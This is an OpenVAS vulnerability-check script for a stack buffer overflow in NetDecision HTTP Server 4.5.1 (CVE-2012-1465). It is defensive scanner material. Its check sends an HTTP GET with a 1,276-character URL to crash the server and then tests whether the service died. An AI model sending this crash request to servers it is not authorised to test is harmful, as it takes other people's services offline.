###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netdecision_http_server_long_req_dos_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# NetDecision HTTP Server Long HTTP Request Remote Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.
  Impact Level: Application";
tag_affected = "Netmechanica NetDecision 4.5.1";
tag_insight = "The flaw is due to a boundary error in the HTTP server when handling
  web requests can be exploited to cause a stack-based buffer overflow via an
  overly-long URL.";
tag_solution = "Upgrade to Netmechanica NetDecision 4.6.1 or later,
  For updates refer to http://www.netmechanica.com/products/?cat_id=2";
tag_summary = "The host is running NetDecision HTTP Server and is prone to denial
  of service vulnerability.";

if(description)
{
  script_id(802617);
  script_bugtraq_id(52208);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-1465");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:N/A:P");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-03-08 15:19:34 +0530 (Thu, 08 Mar 2012)");
  script_name("NetDecision HTTP Server Long HTTP Request Remote Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/79651");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/48168/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52208");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18541/");
  script_xref(name : "URL" , value : "http://www.netmechanica.com/news/?news_id=26");
  script_xref(name : "URL" , value : "http://secpod.org/exploits/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_PoC.py");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SecPod_Netmechanica_NetDecision_HTTP_Server_DoS_Vuln.txt");

  script_description(desc);
  script_summary("Check if NetDecision HTTP Server is vulnerable to denial of service");
  script_category(ACT_DENIAL);
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

## Variable Initialization
req = "";
res = "";
port = 0;
banner = "";

## Get HTTP Port
port = 80;

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if(!banner || "Server: NetDecision-HTTP-Server" >!< banner){
  exit(0);
}

## Construct attack request
req = http_get(item:string("/",crap(1276)), port:port);

## Send crafted request
res = http_send_recv(port:port, data:req);
sleep(3);

## Confirm NetDecision HTTP Server is dead
if(http_is_dead(port:port)){
  security_warning(port);
}
